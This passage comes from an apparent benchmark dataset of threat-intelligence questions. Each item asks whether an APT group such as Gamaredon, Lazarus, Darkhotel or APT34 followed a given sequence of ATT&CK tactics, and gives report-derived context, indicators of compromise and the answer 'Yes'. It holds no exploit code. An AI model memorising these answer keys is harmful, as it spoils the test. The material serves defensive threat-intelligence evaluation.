Command and Control: The group's malware uses both HTTP and HTTPS for command and control.
Exfiltration: Gamaredon's modules automatically upload harvested documents to the C&C server.
Others: The Gamaredon group has been active since at least 2013, mostly targeting Ukrainian institutions. They have increased activity in recent months with constant waves of malicious emails. The group uses a variety of programming languages and simple tools designed to gather sensitive information and spread further. They do not seem to make efforts to stay under the radar, focusing on spreading quickly and exfiltrating data. The group uses many different domains for C&C servers, both free and paid, and changes them frequently. They also use separate domains for small groups of victims. Despite errors in their tools, the group's rapid execution and adaptation create a state of constant dread in their targets. Persistence techniques include scheduled tasks, autorun registry keys, and leveraging the Startup folder. The group's strategy of installing multiple scripts and executables on each system and constantly updating them complicates defenders' efforts.",Yes,Gamaredon group grows its game _ WeLiveSecurity
1023,230,230-Persistence-T1137-Office Application Startup,"After employing modified registry keys to deactivate security mechanisms in Microsoft Office during Defense Evasion, is it likely that Gamaredon will inject malicious macros into Word and Excel documents reachable by the compromised system for Lateral Movement before inserting malicious macros into existing documents for Persistence?","Persistence: The group registers several modules as scheduled tasks for persistence and uses Registry Run keys and the Startup folder to ensure modules execute at every reboot. They also insert malicious macros into existing documents, providing persistence when they are reopened.","Initial Access: The Gamaredon group initiates attacks by sending spearphishing emails with malicious attachments to targets, leveraging trusted relationships by abusing compromised organization's email accounts to send emails with malicious attachments to the victim's contacts.
Execution: Gamaredon employs scripting, mostly Batch files and VBScript, and uses rundll32 to launch malicious DLLs, such as the C/C++ backdoor. They also use CreateProcess to launch additional components, like executing payloads from C&C servers, and rely on user execution of malicious email attachments for initial compromise.
Defense Evasion: Gamaredon uses obfuscated files or information, modifies registry keys to deactivate security mechanisms in Microsoft Office related to macros, and employs code signing with valid certificates. They also deobfuscate and decrypt strings in their modules and add remote templates to documents sent to targets. The C# compiler module contains an obfuscated downloader that is compiled using csc.exe and then executed.
Discovery: The group's backdoors automatically list interesting files, such as Office documents, found on a system for future exfiltration.
Lateral Movement: Gamaredon injects malicious macros into all Word and Excel documents reachable by the compromised system and uses its Outlook VBA macro to send email with malicious attachments to other targets within the same organization.
Collection: Gamaredon's malware searches for sensitive documents on the local system and scans all drives, including removable drives and network shares mounted as drives, for sensitive data. They also have a backdoor that takes screenshots every minute and deploy scripts that automatically scan for interesting documents.
Command and Control: The group's malware uses both HTTP and HTTPS for command and control.
Exfiltration: Gamaredon's modules automatically upload harvested documents to the C&C server.
Others: The Gamaredon group has been active since at least 2013, mostly targeting Ukrainian institutions. They have increased activity in recent months with constant waves of malicious emails. The group uses a variety of programming languages and simple tools designed to gather sensitive information and spread further. They do not seem to make efforts to stay under the radar, focusing on spreading quickly and exfiltrating data. The group uses many different domains for C&C servers, both free and paid, and changes them frequently. They also use separate domains for small groups of victims. Despite errors in their tools, the group's rapid execution and adaptation create a state of constant dread in their targets. Persistence techniques include scheduled tasks, autorun registry keys, and leveraging the Startup folder. The group's strategy of installing multiple scripts and executables on each system and constantly updating them complicates defenders' efforts.",Yes,Gamaredon group grows its game _ WeLiveSecurity
1036,232,232-Reconnaissance-T1596-Search Open Technical Databases,"After Emissary Panda performed network reconnaissance to identify systems vulnerable to EternalBlue (CVE-2017-0144), is it likely that they exploited the Microsoft SharePoint vulnerability (CVE-2019-0604) to install webshells on servers for initial access before uploading Mimikatz and custom backdoors such as HyperBro for execution?","Reconnaissance: In April 2019, Unit 42 observed Emissary Panda (APT27, TG-3390, Bronze Union, Lucky Mouse) exploiting a vulnerability in Microsoft SharePoint (CVE-2019-0604) to install webshells on SharePoint servers of Middle East Government Organizations. They used tools to identify systems vulnerable to CVE-2017-0144, the same exploited by EternalBlue in the WannaCry attacks.","Initial Access: Emissary Panda gained initial access by exploiting a vulnerability in Microsoft SharePoint (CVE-2019-0604) to install webshells on servers. This activity was first observed on April 1, 2019, and continued until April 16, 2019.
Execution: The threat actors uploaded a variety of tools to the compromised servers, including legitimate applications and post-exploitation tools like Mimikatz. They also uploaded custom backdoors such as HyperBro, commonly associated with Emissary Panda.
Persistence: The actors installed webshells on SharePoint servers for persistence. These included the Antak webshell, a variant of the China Chopper webshell, and other related webshells like stylecs.aspx, stylecss.aspx, and test.aspx.
Defense Evasion: Emissary Panda used webshells to upload legitimate executables for DLL sideloading, running malicious DLLs with code overlaps with known Emissary Panda attacks. They also used the China Chopper webshell to maintain access and evade defenses.
Credential Access: The actors used tools like Mimikatz to dump credentials, which were then used to pivot to additional systems within the network.
Discovery: The threat group used tools to perform network reconnaissance, identifying vulnerable systems and gathering information to facilitate lateral movement.
Lateral Movement: Emissary Panda moved laterally across the network using stolen credentials and exploiting vulnerabilities, particularly CVE-2017-0144 (EternalBlue).
Command and Control: The HyperBro backdoor was used for command and control, configured to communicate with a C2 server over HTTPS (hxxps://185.12.45[.]134:443/ajax).
Others: The CTI report includes indicators of compromise (IoCs) and SHA256 hashes of the webshells and malicious tools used by Emissary Panda. Additionally, the report correlates findings with advisories from the Saudi Arabian National Cyber Security Center and the Canadian Center for Cyber Security.",Yes,Emissary Panda Attacks Middle East Government Sharepoint Servers
1051,233,233-Defense Evasion-T1564-Hide Artifacts,"After compromising trusted commercial network resources on a global scale to support their attack infrastructure, is it likely that the Darkhotel APT will use small downloaders and zero-day exploits to execute malicious code before employing techniques such as signing backdoors with digital certificates for defense evasion?","Defense Evasion: The Darkhotel APT uses digital certificates to sign their backdoors, some of which require advanced mathematical capabilities to factorize the keys. They also employ techniques to encrypt and store gathered data in log files, using algorithms similar to RC4.","Reconnaissance: The Darkhotel APT, also known as Tapaoux, has been observed to target specific hotel and business center Wi-Fi networks to compromise guests' devices. They appear to have knowledge of their victims' whereabouts, including names and places of stay, suggesting advanced reconnaissance capabilities.
Resource Development: The Darkhotel APT has demonstrated the ability to compromise trusted commercial network resources on a global scale with strategic precision for years. They possess advanced mathematical and crypto-analytical offensive capabilities, allowing them to undermine the trust extended to Certificate Authorities and the PKI. They also maintain a larger, dynamic infrastructure built of Apache webservers, dynamic DNS records, crypto libraries, and PHP webapps.
Initial Access: The Darkhotel APT gains initial access by targeting hotel guests with malware posing as legitimate software updates for popular packages such as Google Toolbar, Adobe Flash, and Windows Messenger. They also seed Japanese P2P sharing sites with their malware, which is downloaded over 30,000 times in less than six months.
Execution: The Darkhotel APT deploys various malware components that execute on victims' systems. These include small downloaders, information stealers, and advanced keyloggers. They also use 0-day exploits targeting Adobe products and Microsoft Internet Explorer to execute malicious code.
Persistence: The Darkhotel APT maintains persistence on compromised systems through the use of malware that adds autorun registry settings for automatic start during system boot. They also employ a selective infector virus to infiltrate other computers via USB or network shares.
Credential Access: The Darkhotel APT's information stealer module targets stored secrets in Internet Explorer, Firefox, Chrome, and various email services. It is designed to terminate itself on Windows systems with the default codepage set to Korean.
Collection: The Darkhotel APT's keylogger module encrypts and stores gathered data in log files. The information stealer module collects various secrets stored on local systems, including cached passwords and credentials from multiple browsers and email services.
Command and Control: The Darkhotel APT maintains a web interface for victim management, listing and sorting victim systems according to their latest C2 check-in. They encrypt victim data on their servers with single user/passkey combinations across multiple victims.
Others: The Darkhotel APT has been active for almost a decade and is known for its successful attacks against a wide range of victims worldwide. They have used both targeted and botnet-style campaigns, indicating a strong threat actor with sophisticated espionage tools. The APT's targeting of top executives during their stay at certain hotels is particularly notable, as it suggests the attackers have detailed knowledge of their victims' travel plans.",Yes,darkhotel_kl_07.11
1056,233,233-Resource Development-T1584-Compromise Infrastructure,"After performing reconnaissance to gather detailed knowledge of their victims' whereabouts and travel plans, is it likely that the Darkhotel APT will compromise trusted commercial network resources to support their operations before gaining initial access by delivering malware disguised as legitimate software updates?","Resource Development: The Darkhotel APT has demonstrated the ability to compromise trusted commercial network resources on a global scale with strategic precision for years. They possess advanced mathematical and crypto-analytical offensive capabilities, allowing them to undermine the trust extended to Certificate Authorities and the PKI. They also maintain a larger, dynamic infrastructure built of Apache webservers, dynamic DNS records, crypto libraries, and PHP webapps.","Reconnaissance: The Darkhotel APT, also known as Tapaoux, has been observed to target specific hotel and business center Wi-Fi networks to compromise guests' devices. They appear to have knowledge of their victims' whereabouts, including names and places of stay, suggesting advanced reconnaissance capabilities.
Initial Access: The Darkhotel APT gains initial access by targeting hotel guests with malware posing as legitimate software updates for popular packages such as Google Toolbar, Adobe Flash, and Windows Messenger. They also seed Japanese P2P sharing sites with their malware, which is downloaded over 30,000 times in less than six months.
Execution: The Darkhotel APT deploys various malware components that execute on victims' systems. These include small downloaders, information stealers, and advanced keyloggers. They also use 0-day exploits targeting Adobe products and Microsoft Internet Explorer to execute malicious code.
Persistence: The Darkhotel APT maintains persistence on compromised systems through the use of malware that adds autorun registry settings for automatic start during system boot. They also employ a selective infector virus to infiltrate other computers via USB or network shares.
Defense Evasion: The Darkhotel APT uses digital certificates to sign their backdoors, some of which require advanced mathematical capabilities to factorize the keys. They also employ techniques to encrypt and store gathered data in log files, using algorithms similar to RC4.
Credential Access: The Darkhotel APT's information stealer module targets stored secrets in Internet Explorer, Firefox, Chrome, and various email services. It is designed to terminate itself on Windows systems with the default codepage set to Korean.
Collection: The Darkhotel APT's keylogger module encrypts and stores gathered data in log files. The information stealer module collects various secrets stored on local systems, including cached passwords and credentials from multiple browsers and email services.
Command and Control: The Darkhotel APT maintains a web interface for victim management, listing and sorting victim systems according to their latest C2 check-in. They encrypt victim data on their servers with single user/passkey combinations across multiple victims.
Others: The Darkhotel APT has been active for almost a decade and is known for its successful attacks against a wide range of victims worldwide. They have used both targeted and botnet-style campaigns, indicating a strong threat actor with sophisticated espionage tools. The APT's targeting of top executives during their stay at certain hotels is particularly notable, as it suggests the attackers have detailed knowledge of their victims' travel plans.",Yes,darkhotel_kl_07.11
1059,233,233-Credential Access-T1555-Credentials from Password Stores,"After deploying malware components such as downloaders, stealers, or advanced keyloggers during execution, is it likely that the Darkhotel APT will use sophisticated capabilities like signing backdoors with digital certificates and encrypting gathered data in log files for defense evasion before targeting stored secrets in browsers and email services for credential access?","Credential Access: The Darkhotel APT's information stealer module targets stored secrets in Internet Explorer, Firefox, Chrome, and various email services. It is designed to terminate itself on Windows systems with the default codepage set to Korean.","Reconnaissance: The Darkhotel APT, also known as Tapaoux, has been observed to target specific hotel and business center Wi-Fi networks to compromise guests' devices. They appear to have knowledge of their victims' whereabouts, including names and places of stay, suggesting advanced reconnaissance capabilities.
Resource Development: The Darkhotel APT has demonstrated the ability to compromise trusted commercial network resources on a global scale with strategic precision for years. They possess advanced mathematical and crypto-analytical offensive capabilities, allowing them to undermine the trust extended to Certificate Authorities and the PKI. They also maintain a larger, dynamic infrastructure built of Apache webservers, dynamic DNS records, crypto libraries, and PHP webapps.
Initial Access: The Darkhotel APT gains initial access by targeting hotel guests with malware posing as legitimate software updates for popular packages such as Google Toolbar, Adobe Flash, and Windows Messenger. They also seed Japanese P2P sharing sites with their malware, which is downloaded over 30,000 times in less than six months.
Execution: The Darkhotel APT deploys various malware components that execute on victims' systems. These include small downloaders, information stealers, and advanced keyloggers. They also use 0-day exploits targeting Adobe products and Microsoft Internet Explorer to execute malicious code.
Persistence: The Darkhotel APT maintains persistence on compromised systems through the use of malware that adds autorun registry settings for automatic start during system boot. They also employ a selective infector virus to infiltrate other computers via USB or network shares.
Defense Evasion: The Darkhotel APT uses digital certificates to sign their backdoors, some of which require advanced mathematical capabilities to factorize the keys. They also employ techniques to encrypt and store gathered data in log files, using algorithms similar to RC4.
Collection: The Darkhotel APT's keylogger module encrypts and stores gathered data in log files. The information stealer module collects various secrets stored on local systems, including cached passwords and credentials from multiple browsers and email services.
Command and Control: The Darkhotel APT maintains a web interface for victim management, listing and sorting victim systems according to their latest C2 check-in. They encrypt victim data on their servers with single user/passkey combinations across multiple victims.
Others: The Darkhotel APT has been active for almost a decade and is known for its successful attacks against a wide range of victims worldwide. They have used both targeted and botnet-style campaigns, indicating a strong threat actor with sophisticated espionage tools. The APT's targeting of top executives during their stay at certain hotels is particularly notable, as it suggests the attackers have detailed knowledge of their victims' travel plans.",Yes,darkhotel_kl_07.11
1075,236,236-Execution-T1059-Command and Scripting Interpreter,"After achieving initial access through malicious documents containing job offers and activating macros on the victims' home computers, is the Lazarus Group likely to execute malicious code and leverage the SQLite DLL before maintaining persistence by creating services using sc.exe utility and placing shortcuts in the startup folder?",Execution: The Lazarus Group executed malicious code using system utilities and a backdoor named CommsCacher. They also used the Windows command line to run commands and leveraged the legitimate SQLite DLL library with a malicious exported function sqlite3_create_functionex for execution.,"Reconnaissance: In September 2020, the Lazarus Group initiated a cyber attack on a large pharmaceutical company. The attack began with the delivery of malicious documents containing job offers to company employees. These documents, once opened, activated malicious macros on the victims' home computers. The attackers used system utilities like ipconfig.exe, ping.exe, and net.exe for reconnaissance, as well as unknown PE files. The backdoor named CommsCacher and its configuration file encrypted with the VEST algorithm were used to monitor RDP sessions on the compromised computer. The attackers attempted to connect to the domain forecareer[.]com, which was registered shortly before the attack and mimicked the official website of General Dynamics Mission Systems.
Initial Access: The initial access to the pharmaceutical company's network was achieved when employees opened malicious documents sent to them, which contained job offers. These documents were named GD2020090939393903.doc and GD20200909GAB31.doc. The attack vectors included LinkedIn, Telegram, WhatsApp, and corporate email. The documents activated malicious macros on the victims' home computers.
Persistence: To maintain their foothold, the Lazarus Group created services using the sc.exe utility and local administrator accounts. They also placed shortcuts in the startup folder for persistence.
Privilege Escalation: The Lazarus Group escalated privileges by creating local administrator accounts and manipulating system processes and services.
Defense Evasion: The group used various techniques to evade detection, including encrypting configuration files with the VEST algorithm, hiding malware in hidden folders at C:\ProgramData, and removing malware samples from the file system. They also used rundll32.exe to launch a malicious DLL.
Discovery: The Lazarus Group collected information about users, network settings, and processes using system utilities like net user, adfind, tasklist.exe, and systeminfo.exe. They also used the SMBMap utility to discover shared folders within the network.
Lateral Movement: The group used compromised legitimate privileged accounts to move laterally on the network and their own data encryption algorithm to communicate with the C2 servers.
Command and Control: The Lazarus Group's malware used the standard HTTP protocol to connect to the C2 servers, which were disguised as legitimate domains and hosted on resources located in various countries.
Others: The Lazarus Group, also known as Hidden Cobra, has been operating since at least 2009 and is thought to be a government-sponsored APT group from North Korea. The group's main attack vector is targeted phishing through third-party resources. The group's TTPs allowed them to gain partial control over the pharmaceutical company's infrastructure within four days. The attackers used both publicly available software and tools of their own design. The incident response and threat intelligence teams at PT Expert Security Center were involved in the investigation and response to the attack.",Yes,Lazarus Group Recruitment_ Threat Hunters vs Head Hunters
1082,236,236-Command and Control-T1071-Application Layer Protocol,"After moving laterally within the network using compromised privileged accounts, is it likely that the Lazarus Group's malware will use the HTTP protocol to communicate with C2 servers hosted on legitimate domains located in various countries?","Command and Control: The Lazarus Group's malware used the standard HTTP protocol to connect to the C2 servers, which were disguised as legitimate domains and hosted on resources located in various countries.","Reconnaissance: In September 2020, the Lazarus Group initiated a cyber attack on a large pharmaceutical company. The attack began with the delivery of malicious documents containing job offers to company employees. These documents, once opened, activated malicious macros on the victims' home computers. The attackers used system utilities like ipconfig.exe, ping.exe, and net.exe for reconnaissance, as well as unknown PE files. The backdoor named CommsCacher and its configuration file encrypted with the VEST algorithm were used to monitor RDP sessions on the compromised computer. The attackers attempted to connect to the domain forecareer[.]com, which was registered shortly before the attack and mimicked the official website of General Dynamics Mission Systems.
Initial Access: The initial access to the pharmaceutical company's network was achieved when employees opened malicious documents sent to them, which contained job offers. These documents were named GD2020090939393903.doc and GD20200909GAB31.doc. The attack vectors included LinkedIn, Telegram, WhatsApp, and corporate email. The documents activated malicious macros on the victims' home computers.
Execution: The Lazarus Group executed malicious code using system utilities and a backdoor named CommsCacher. They also used the Windows command line to run commands and leveraged the legitimate SQLite DLL library with a malicious exported function sqlite3_create_functionex for execution.
Persistence: To maintain their foothold, the Lazarus Group created services using the sc.exe utility and local administrator accounts. They also placed shortcuts in the startup folder for persistence.
Privilege Escalation: The Lazarus Group escalated privileges by creating local administrator accounts and manipulating system processes and services.
Defense Evasion: The group used various techniques to evade detection, including encrypting configuration files with the VEST algorithm, hiding malware in hidden folders at C:\ProgramData, and removing malware samples from the file system. They also used rundll32.exe to launch a malicious DLL.
Discovery: The Lazarus Group collected information about users, network settings, and processes using system utilities like net user, adfind, tasklist.exe, and systeminfo.exe. They also used the SMBMap utility to discover shared folders within the network.
Lateral Movement: The group used compromised legitimate privileged accounts to move laterally on the network and their own data encryption algorithm to communicate with the C2 servers.
Others: The Lazarus Group, also known as Hidden Cobra, has been operating since at least 2009 and is thought to be a government-sponsored APT group from North Korea. The group's main attack vector is targeted phishing through third-party resources. The group's TTPs allowed them to gain partial control over the pharmaceutical company's infrastructure within four days. The attackers used both publicly available software and tools of their own design. The incident response and threat intelligence teams at PT Expert Security Center were involved in the investigation and response to the attack.",Yes,Lazarus Group Recruitment_ Threat Hunters vs Head Hunters
1083,236,236-Command and Control-T1102-Web Service,"After the Lazarus Group used compromised legitimate privileged accounts for lateral movement on the network and communicated with their C2 servers using a self-designed encryption algorithm, is it likely that their malware leveraged the HTTP protocol to connect to C2 servers, which were disguised as legitimate domains and hosted on resources located in various countries?","Command and Control: The Lazarus Group's malware used the standard HTTP protocol to connect to the C2 servers, which were disguised as legitimate domains and hosted on resources located in various countries.","Reconnaissance: In September 2020, the Lazarus Group initiated a cyber attack on a large pharmaceutical company. The attack began with the delivery of malicious documents containing job offers to company employees. These documents, once opened, activated malicious macros on the victims' home computers. The attackers used system utilities like ipconfig.exe, ping.exe, and net.exe for reconnaissance, as well as unknown PE files. The backdoor named CommsCacher and its configuration file encrypted with the VEST algorithm were used to monitor RDP sessions on the compromised computer. The attackers attempted to connect to the domain forecareer[.]com, which was registered shortly before the attack and mimicked the official website of General Dynamics Mission Systems.
Initial Access: The initial access to the pharmaceutical company's network was achieved when employees opened malicious documents sent to them, which contained job offers. These documents were named GD2020090939393903.doc and GD20200909GAB31.doc. The attack vectors included LinkedIn, Telegram, WhatsApp, and corporate email. The documents activated malicious macros on the victims' home computers.
Execution: The Lazarus Group executed malicious code using system utilities and a backdoor named CommsCacher. They also used the Windows command line to run commands and leveraged the legitimate SQLite DLL library with a malicious exported function sqlite3_create_functionex for execution.
Persistence: To maintain their foothold, the Lazarus Group created services using the sc.exe utility and local administrator accounts. They also placed shortcuts in the startup folder for persistence.
Privilege Escalation: The Lazarus Group escalated privileges by creating local administrator accounts and manipulating system processes and services.
Defense Evasion: The group used various techniques to evade detection, including encrypting configuration files with the VEST algorithm, hiding malware in hidden folders at C:\ProgramData, and removing malware samples from the file system. They also used rundll32.exe to launch a malicious DLL.
Discovery: The Lazarus Group collected information about users, network settings, and processes using system utilities like net user, adfind, tasklist.exe, and systeminfo.exe. They also used the SMBMap utility to discover shared folders within the network.
Lateral Movement: The group used compromised legitimate privileged accounts to move laterally on the network and their own data encryption algorithm to communicate with the C2 servers.
Others: The Lazarus Group, also known as Hidden Cobra, has been operating since at least 2009 and is thought to be a government-sponsored APT group from North Korea. The group's main attack vector is targeted phishing through third-party resources. The group's TTPs allowed them to gain partial control over the pharmaceutical company's infrastructure within four days. The attackers used both publicly available software and tools of their own design. The incident response and threat intelligence teams at PT Expert Security Center were involved in the investigation and response to the attack.",Yes,Lazarus Group Recruitment_ Threat Hunters vs Head Hunters
1086,236,236-Reconnaissance-T1592-Gather Victim Host Information,"After gaining initial access through malicious documents containing job offers sent via LinkedIn, Telegram, WhatsApp, and corporate email, is it likely that the Lazarus Group will use system utilities like ipconfig.exe and net.exe to gather victim host information during reconnaissance before executing malicious code using the CommsCacher backdoor and leveraging the SQLite DLL library in the victim's environment?","Reconnaissance: In September 2020, the Lazarus Group initiated a cyber attack on a large pharmaceutical company. The attack began with the delivery of malicious documents containing job offers to company employees. These documents, once opened, activated malicious macros on the victims' home computers. The attackers used system utilities like ipconfig.exe, ping.exe, and net.exe for reconnaissance, as well as unknown PE files. The backdoor named CommsCacher and its configuration file encrypted with the VEST algorithm were used to monitor RDP sessions on the compromised computer. The attackers attempted to connect to the domain forecareer[.]com, which was registered shortly before the attack and mimicked the official website of General Dynamics Mission Systems.","Initial Access: The initial access to the pharmaceutical company's network was achieved when employees opened malicious documents sent to them, which contained job offers. These documents were named GD2020090939393903.doc and GD20200909GAB31.doc. The attack vectors included LinkedIn, Telegram, WhatsApp, and corporate email. The documents activated malicious macros on the victims' home computers.
Execution: The Lazarus Group executed malicious code using system utilities and a backdoor named CommsCacher. They also used the Windows command line to run commands and leveraged the legitimate SQLite DLL library with a malicious exported function sqlite3_create_functionex for execution.
Persistence: To maintain their foothold, the Lazarus Group created services using the sc.exe utility and local administrator accounts. They also placed shortcuts in the startup folder for persistence.
Privilege Escalation: The Lazarus Group escalated privileges by creating local administrator accounts and manipulating system processes and services.
Defense Evasion: The group used various techniques to evade detection, including encrypting configuration files with the VEST algorithm, hiding malware in hidden folders at C:\ProgramData, and removing malware samples from the file system. They also used rundll32.exe to launch a malicious DLL.
Discovery: The Lazarus Group collected information about users, network settings, and processes using system utilities like net user, adfind, tasklist.exe, and systeminfo.exe. They also used the SMBMap utility to discover shared folders within the network.
Lateral Movement: The group used compromised legitimate privileged accounts to move laterally on the network and their own data encryption algorithm to communicate with the C2 servers.
Command and Control: The Lazarus Group's malware used the standard HTTP protocol to connect to the C2 servers, which were disguised as legitimate domains and hosted on resources located in various countries.
Others: The Lazarus Group, also known as Hidden Cobra, has been operating since at least 2009 and is thought to be a government-sponsored APT group from North Korea. The group's main attack vector is targeted phishing through third-party resources. The group's TTPs allowed them to gain partial control over the pharmaceutical company's infrastructure within four days. The attackers used both publicly available software and tools of their own design. The incident response and threat intelligence teams at PT Expert Security Center were involved in the investigation and response to the attack.",Yes,Lazarus Group Recruitment_ Threat Hunters vs Head Hunters
1106,238,238-Defense Evasion-T1553-Subvert Trust Controls,"After disguising executable malware files with legitimate-looking document names for execution, is it likely that the attackers will leverage untrusted and faked digital signatures for defense evasion before utilizing command-and-control infrastructure with changing and static IPs hosted on DynDNS services?","Defense Evasion: The attackers utilized digital signatures to make the malware appear legitimate, even though the certificates were untrusted and faked. This tactic was used to evade defenses and increase the likelihood of the malware being executed by the target.","Initial Access: We have observed multiple malware attacks against Israeli and Palestinian targets, likely performed by the same attacker. The attacks utilized spear phishing emails with malicious attachments, such as the one purporting to come from IDF Chief of Staff Benny Gantz. The malware files, often digitally signed to appear legitimate, were typically contained in self-extracting RAR files with misleading names that disguised their executable nature.
Execution: The malware identified in the attacks includes the XtremeRat backdoor trojan, which is commercially available and has been used in various attacks over the years. This malware was found in executable files disguised as documents, such as 'IDF strikes militants in Gaza Strip following rocket barrage.doc.scr', and was signed with a digital certificate that appeared to be from Microsoft, although it was actually untrusted and faked.
Command and Control: The malware communicated with command-and-control (C&C) structures hosted on various DynDNS services, with IP addresses resolving to hosting services in the US. The C&C infrastructure was shared among the malware samples, indicating a coordinated attack. The IP addresses used for C&C servers changed regularly, with some remaining static for longer periods.
Others: The attacks have been ongoing for at least a year, initially focusing on Palestinian targets before shifting to Israeli targets. The purpose of the attacks is assumed to be espionage/surveillance. The attacker remains unknown, but the use of off-the-shelf malware suggests a lower-cost operation. The attacks likely involved email attachments containing malicious files within archives like RAR or ZIP. Document metadata from bait attachments revealed usernames associated with the creation and modification of the documents, providing clues about the attackers.",Yes,Cyberattack_against_Israeli_and_Palestinian_targets
1115,24,24-Command and Control-T1568-Dynamic Resolution,"After LYCEUM gained initial access through password spraying or brute-force attacks and executed DanBot malware using DNS and HTTP-based communication mechanisms, is it likely that the group registered new domains suspected to be part of their command and control infrastructure?","Command and Control: LYCEUM registered new domains for individual campaigns, which were typically used within a few weeks of registration. These domains, suspected to be part of LYCEUM's command and control infrastructure, often had a security or web technology theme.","Initial Access: The LYCEUM threat group gained initial access to organizations by using account credentials obtained through password spraying or brute-force attacks. They then sent spearphishing emails with malicious Excel attachments to deliver the DanBot malware.
Execution: LYCEUM executed the DanBot malware, a first-stage remote access trojan (RAT) that uses DNS and HTTP-based communication mechanisms. The malware provides basic remote access capabilities, including the ability to execute arbitrary commands via cmd.exe and to upload and download files. Additionally, the group used a PowerShell-based keylogger (kl.ps1), a script to decrypt passwords from the RDCMan configuration file (Decrypt-RDCMan.ps1), and a script to gather account information from Active Directory (Get-LAPSP.ps1).
Defense Evasion: LYCEUM utilized DanDrop, a VBA macro embedded in an Excel XLS file, to drop the DanBot malware. They made incremental improvements to obfuscate the macro and refactor some of the functionality to evade defenses.
Credential Access: LYCEUM deployed tools such as Decrypt-RDCMan.ps1 to decrypt passwords stored in the RDCMan configuration file and Get-LAPSP.ps1 to gather account information from Active Directory, which could provide additional access within the environment.
Discovery: LYCEUM targeted HR and IT personnel with spearphishing emails to compromise accounts that could yield information and access for further spearphishing operations within the targeted environment and against associated organizations.
Others: The LYCEUM threat group has been active since at least April 2018, targeting critical infrastructure organizations in the Middle East, particularly in the oil and gas sector. They have demonstrated capabilities similar to other threat groups operating in the region, such as COBALT GYPSY and COBALT TRINITY. Secureworks Counter Threat Unit researchers recommend implementing multi-factor authentication, increasing visibility via endpoint detection, response, and logging, conducting preparedness exercises, and reinforcing phishing awareness to mitigate the threat posed by LYCEUM.",Yes,Cyber Threat Group LYCEUM Takes Center Stage in Middle East Campaign
1123,240,240-Command and Control-T1571-Non-Standard Port,"After using DLL side-loading to decrypt and execute an encrypted payload for defense evasion, is it likely that the attack's final payload will establish a remote command shell before connecting back to the command and control server at IP address 160.20.147.254 on port 9999 for command and control?","Command and Control: The final payload of the attack was a DLL file designed to establish a simple remote command shell, connecting back to a server with the IP address 160.20.147.254 on port 9999. The code contained a string used to generate a key for decrypting data received from the command and control server: 'Happiness is a way station between too much and too little.'","Execution: A new Advanced Persistent Threat (APT) group has been observed using DLL side-loading to execute malicious code. The technique involves spoofing a legitimate DLL with a malicious one, which is then executed by legitimate Windows executables. This method has been seen in use by Chinese APT groups since 2013 and has now been adopted by cybercrime groups. The payload, which has not been seen before, contains plaintext strings with politically inspired messages. The attacks targeted non-governmental organizations and other entities in Myanmar, suggesting the involvement of a Chinese APT group.
Defense Evasion: The APT group used DLL side-loading as a defense evasion technique. This involved using a clean loader, such as a renamed Microsoft antivirus component or DISM.EXE, to load a malicious DLL that decrypts and executes an encrypted payload. The payloads were encrypted using a simple XOR algorithm with keys such as 'Hapenexx is very bad' and 'HELLO_USA_PRISIDENT'. The PDB paths found in the samples suggest a common origin for the malware, with folder names like 'KilllSomeOne'. The group also took steps to conceal the malware and prepare file space for data collection, including assigning 'hidden' and 'system' attributes to files and using a sophisticated installer for the simple shell.
Exfiltration: The APT group configured the system for data exfiltration by creating a desktop.ini file on removable and non-system drives to mimic a 'Recycle Bin' folder. They then copied files to this folder and collected system information, including volume names and free disk space. The installer also copied all .dat files used in the side-loading scenarios into the installation directories.",Yes,A new APT uses DLL side-loads to “KilllSomeOne” – Sophos News
1132,242,242-Defense Evasion-T1205-Traffic Signaling,"Before APT34's campaign utilized DNS tunneling for evasion by employing the requestbin.net DNS tunneling service, is it likely that the malicious macros within the Word document executed actions such as verifying a mouse connection for anti-sandboxing, communicating with the C2 server, and dropping an embedded executable with a '.doc' extension?","Defense Evasion: APT34's campaign utilized DNS tunneling to avoid detection, with the initial macros stage using DNS requests to beacon back to the attacker and deliver victim identifiable information. The attacker employed the requestbin.net DNS tunneling service to receive updates about the infection progress without exposing their infrastructure.","Initial Access: Check Point Research identified a new campaign by the Iranian threat group APT34 targeting a Lebanese entity using a novel backdoor variant named SideTwist. The initial access was achieved through a malicious Microsoft Word document titled 'Job-Details.doc' (md5: 6615c410b8d7411ed14946635947325e) delivered via LinkedIn messages. The document contained embedded malicious macros that, when activated, initiated the infection process.
Execution: The malicious macros within the Word document executed a series of actions upon activation: verifying a mouse connection (anti-sandboxing), fingerprinting the target device, communicating with the C2 server, dropping an embedded executable with a '.doc' extension (later renamed to '.exe'), and registering a Windows scheduled task to launch the executable periodically.
Persistence: Persistence was established by the initial stage macros through a scheduled task named 'SystemFailureReporter,' which was set to execute the second stage payload, SideTwist, every 5 minutes.
Command and Control: The SideTwist backdoor communicated with the C&C server (sarmsoftware[.]com) using HTTP on port 443, with port 80 as a fallback. The backdoor used different techniques for outgoing and incoming communications, both encrypted using the Mersenne Twister pseudorandom number generator. Commands were received from the server by searching for specific patterns hidden inside the HTML content of a legitimate-looking website, in this case, a fake Flickr page.
Others: APT34, also known as OilRig, has been actively updating their payload arsenal post-2019 tool leak by Lab Dookhtegan. The group has a history of targeting individuals with job opportunity documents and has continued this method in their latest campaign. The SideTwist backdoor variant is new but provides functionality similar to other C-based backdoors used by APT34, such as DNSpionage and TONEDEAF. The campaign also involved another APT34 tool, a .NET-based backdoor named Karkoff, which used internet-facing exchange servers for communication. The Lebanese Government's exchange server (mail.army.gov[.]lb) credentials were found within the Karkoff implant, suggesting a potential long-term compromise. Check Point Sandblast provides protection against this APT attack.",Yes,Iran’s APT34 Returns with an Updated Arsenal - Check Point Research
1141,244,244-Initial Access-T1566-Phishing,"After exploiting the Follina vulnerability for initial access, is it likely that the GroundPeony threat group will execute malicious executables such as ""Install.exe"" renamed to ""mic.exe"" for DLL side-loading before establishing communication with the C&C server using encoded information within the ""mic.ver"" configuration file?","Initial Access: The GroundPeony threat group, also known as UNC3347, has been actively targeting East and South Asian countries since at least 2021. They have been observed exploiting a zero-day vulnerability, Follina (CVE-2022-30190), and compromising target-related websites to distribute malware. The group's recent campaign involved spear-phishing emails with lure documents and URL obfuscation to download and execute malicious payloads from compromised websites, ultimately establishing communication with a C&C server.","Execution: The GroundPeony campaign utilized a malicious executable named "".exe"" or ""Install.exe"" which was copied and renamed to ""mic.exe"" for DLL side-loading. The side-loaded DLL, ""version.dll"", functioned as a shellcode launcher for ""mic.doc"", which is a shellcode downloader known as micDown. The ""mic.ver"" file served as a config file for ""mic.doc"". The attack flow involved executing the renamed executable, loading and decrypting the associated files, and communicating with the C&C server.
